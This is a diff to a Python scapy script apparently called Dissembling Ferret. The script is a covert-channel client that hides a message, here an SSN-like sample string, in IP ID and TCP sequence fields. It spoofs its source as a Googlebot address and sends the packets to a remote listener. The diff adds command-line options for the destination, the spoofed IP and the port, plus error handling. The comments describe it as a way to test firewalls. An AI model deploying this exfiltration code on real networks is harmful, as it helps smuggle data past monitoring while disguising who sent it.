@@ -61,6 +61,49 @@ import netifaces
 import re
 import time
 
+#from IPy import IP # Namespace collision with scapy
+import IPy
+from optparse import OptionParser
+
+parser = OptionParser()
+parser.add_option ("-d", "--dest", dest="destination_ip", default="foo",
+                    help="Destination IP for the hidden message")
+parser.add_option ("-s", "--spoof", dest="spoof_ip", default="66.249.66.1",
+                    help="Spoof the source IP address as this value")
+parser.add_option ("-p", "--port", dest="dstport", default="80",
+                    help="Destination port (port for Dissembling Ferret server listener)")
+(options, args) = parser.parse_args()
+
+destination = options.destination_ip
+spoof = options.spoof_ip
+dstport = int(options.dstport)
+
+# Ensure we have a destination specified
+if destination == "foo":
+    parser.print_help()
+    exit(0)
+
+# Make sure IP addresses are real
+try:
+    IPy.IP(destination)
+except ValueError:
+    print "\nERROR: Invalid destination IP address\n"
+    parser.print_help()
+    exit(0)
+
+try:
+    IPy.IP(spoof)
+except ValueError:
+    print "\nERROR: Invalid spoof source IP address\n"
+    parser.print_help()
+    exit(0)
+
+if dstport < 0 or dstport > 65535:
+    print "\nERROR: Destination port number is invalid, try a number 0 to 65,535\n"
+    parser.print_help()
+    exit(0)
+
+
 # ================
 # Global variables
 # ================
@@ -81,11 +124,11 @@ message = 'foo bar 111-22-3333'
 exfilArray = []
 
 # Get destination from the command-line.
-destination = str(sys.argv[1])
+#-destination = str(sys.argv[1])
 
 # Hard-code destination
 # TODO we should consider using a config for this and other testable things
-#destination = '192.168.12'
+#-destination = '192.168.12'
 
 print '[+] destination: ' + destination
 
@@ -93,7 +136,7 @@ print '[+] destination: ' + destination
 # the source host will be our server.
 bounce = ''
 # Spoof our source
-spoof = '66.249.66.1'  # crawl-66-249-66-1.googlebot.com
+#-spoof = '66.249.66.1'  # crawl-66-249-66-1.googlebot.com
 #spoof = '8.8.8.8'     # google-public-dns-a.google.com
 # Get our real ip. This is especially useful in NAT'd environments.
 interfaces = netifaces.interfaces()
@@ -106,9 +149,9 @@ interfaces = netifaces.interfaces()
 # TODO: Add functions to perform the various techniques to test a firewall against.
 
 # Print usage details
-def usage():
-    # Should we set a sensible default? e.g. 127.0.0.1 80
-    print 'sudo ./dissferret-client.py [destination IP] [destination port]'
+#-def usage():
+    #- Should we set a sensible default? e.g. 127.0.0.1 80
+    #- print 'sudo ./dissferret-client.py [destination IP] [destination port]'
 
 
 # Does x fit in a 16bit int?
@@ -207,7 +250,11 @@ def add_n0ise_iseq(i):
     pkt.seq = y + randy
     # Signal noisy packet
     pkt.window = int(8182) - random.randint(23, 275)
-    send(pkt)
+    try:
+        send(pkt)
+    except socket.error:
+        print "\nERROR: Problem sending packets, are you root?\n"
+        exit(0)
 
 
 def add_n0ise_ipid(i):
@@ -218,7 +265,11 @@ def add_n0ise_ipid(i):
     pkt.seq = y + randy
     # Signal noisy packet
     pkt.window = int(8182) - random.randint(23, 275)
-    send(pkt)
+    try:
+        send(pkt)
+    except socket.error:
+        print "\nERROR: Problem sending packets, are you root?\n"
+        exit(0)
 
 
 # In IPv4, the Identification (ID) field is a 16-bit value.
@@ -233,7 +284,11 @@ def exfil_ipid():
         add_n0ise_ipid(i)
         pkt.id = exfilArray[i]
         time.sleep(0.4)
-        send(pkt)
+        try:
+            send(pkt)
+        except socket.error:
+            print "\nERROR: Problem sending packets, are you root?\n"
+            exit(0)
         i += 1
     send_eom()
 
@@ -248,7 +303,11 @@ def exfil_iseq():
         pkt.seq = exfilArray[i]
         # slow our roll
         time.sleep(0.4)
-        send(pkt)
+        try:
+            send(pkt)
+        except socket.error:
+            print "\nERROR: Problem sending packets, are you root?\n"
+            exit(0)
         i += 1
     send_eom()
 
@@ -264,7 +323,11 @@ def exfil_bounce():
         pkt.window = k
         pkt.seq = exfilArray[i]
         time.sleep(0.4)
-        send(pkt)
+        try:
+            send(pkt)
+        except socket.error:
+            print "\nERROR: Problem sending packets, are you root?\n"
+            exit(0)
         i += 1
     send_eom()
 
@@ -313,7 +376,7 @@ msglen = len(exfilArray)
 # Future work: adjust some fields to perhaps better emulate commonly seen traffic.
 # TODO we should add dport and flags as configurable options.
 # TODO add check, sys.argv[2] must be between 1-65565
-dstport = int(sys.argv[2])
+#-dstport = int(sys.argv[2])
 # Craft our basic packet.
 pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
 
@@ -336,4 +399,3 @@ print '[*] Sent using IPID: %s' % message
 
 
 # ==== use bounce host
-
